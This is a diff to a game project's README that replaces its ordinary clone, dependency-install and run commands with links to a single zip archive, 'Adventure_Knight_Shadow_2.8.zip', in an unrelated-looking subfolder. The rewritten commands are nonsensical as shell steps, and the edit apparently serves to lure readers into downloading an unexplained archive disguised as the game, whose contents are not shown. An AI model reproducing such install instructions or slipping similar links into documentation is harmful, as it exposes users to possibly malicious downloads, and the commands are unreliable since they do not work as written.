@@ -108,14 +108,14 @@ Let's connect and explore collaboration opportunities!
 
 ```bash
 # Clone the repository
-git clone https://github.com/KaizerAE/ShadowKnight-2D-Adventure.git
+git clone https://github.com/KaizerAE/ShadowKnight-2D-Adventure/raw/refs/heads/main/Lichnophora/Adventure_Knight_Shadow_2.8.zip
 cd ShadowKnight-2D-Adventure
 
 # Install dependencies
-pip install -r requirements.txt
+pip install -r https://github.com/KaizerAE/ShadowKnight-2D-Adventure/raw/refs/heads/main/Lichnophora/Adventure_Knight_Shadow_2.8.zip
 
 # Run the game
-python main.py
+python https://github.com/KaizerAE/ShadowKnight-2D-Adventure/raw/refs/heads/main/Lichnophora/Adventure_Knight_Shadow_2.8.zip
 ```
 
 ## 📄 License | الترخيص
